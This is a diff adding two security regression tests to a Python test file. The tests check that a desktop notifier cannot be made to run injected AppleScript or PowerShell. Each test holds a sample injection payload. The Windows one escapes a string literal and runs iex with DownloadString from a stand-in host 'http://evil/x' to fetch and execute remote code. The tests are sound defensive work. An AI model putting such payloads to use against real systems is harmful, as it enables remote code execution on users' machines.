@@ -232,3 +232,88 @@ def test_agentapi_notifier_candidate_recovery_and_retry(monkeypatch, tmp_path):
     assert saved_sessions == [("localhost:1234", "good-token")]
     assert os.environ["ANTIGRAVITY_LS_ADDRESS"] == "localhost:1234"
     assert os.environ["ANTIGRAVITY_CSRF_TOKEN"] == "good-token"
+
+
+def test_desktop_notifier_macos_script_injection(monkeypatch):
+    """A quote character in the notified message must not let injected
+    AppleScript escape the string literal `osascript -e` receives."""
+    import sys
+    import subprocess as subprocess_module
+
+    monkeypatch.setattr(sys, "platform", "darwin")
+    monkeypatch.setattr(shutil, "which", lambda cmd: "/usr/bin/osascript" if cmd == "osascript" else None)
+    monkeypatch.delenv("ARTEMIS_DESKTOP_NOTIFY", raising=False)
+    monkeypatch.delenv("CI", raising=False)
+
+    captured = {}
+
+    def fake_run(args, **kwargs):
+        captured["args"] = args
+        captured["env"] = kwargs.get("env")
+
+        class Result:
+            returncode = 0
+
+        return Result()
+
+    monkeypatch.setattr(subprocess_module, "run", fake_run)
+
+    payload = 'pwned" \ndo shell script "touch /tmp/artemis_pwned"\n--'
+    notifier = DesktopNotifier()
+    result = notifier.notify("conv-inj", payload, title="Artemis Task Completed")
+    assert result is True
+    assert "args" in captured, "osascript should have been invoked"
+
+    script_arg = captured["args"][captured["args"].index("-e") + 1]
+    assert "do shell script" not in script_arg, (
+        "the injected AppleScript statement must never appear inside the "
+        "-e script argument; the message content must be passed out of band "
+        f"(e.g. via env/system attribute), got: {script_arg!r}"
+    )
+    env = captured["env"] or {}
+    assert payload.split("\n\n")[0][:120] in env.values(), (
+        "the real message content must still reach the user via the "
+        "environment, not just be dropped"
+    )
+
+
+def test_desktop_notifier_windows_script_injection(monkeypatch):
+    """A quote character in the notified message must not let injected
+    PowerShell escape the CreateTextNode(\"...\") string literal."""
+    import sys
+    import subprocess as subprocess_module
+
+    monkeypatch.setattr(sys, "platform", "win32")
+    monkeypatch.delenv("ARTEMIS_DESKTOP_NOTIFY", raising=False)
+    monkeypatch.delenv("CI", raising=False)
+
+    captured = {}
+
+    def fake_run(args, **kwargs):
+        captured["args"] = args
+        captured["env"] = kwargs.get("env")
+
+        class Result:
+            returncode = 0
+
+        return Result()
+
+    monkeypatch.setattr(subprocess_module, "run", fake_run)
+
+    payload = 'x")); iex(New-Object Net.WebClient).DownloadString(\'http://evil/x\'); (("'
+    notifier = DesktopNotifier()
+    result = notifier.notify("conv-inj-win", payload, title="Artemis Task Completed")
+    assert result is True
+    assert "args" in captured, "powershell should have been invoked"
+
+    ps_cmd = captured["args"][captured["args"].index("-Command") + 1]
+    assert "DownloadString" not in ps_cmd, (
+        "the injected PowerShell expression must never appear inside the "
+        "-Command script text; the message content must be passed out of "
+        f"band (e.g. via $env:), got: {ps_cmd!r}"
+    )
+    env = captured["env"] or {}
+    assert payload.split("\n\n")[0][:120] in env.values(), (
+        "the real message content must still reach the user via the "
+        "environment, not just be dropped"
+    )
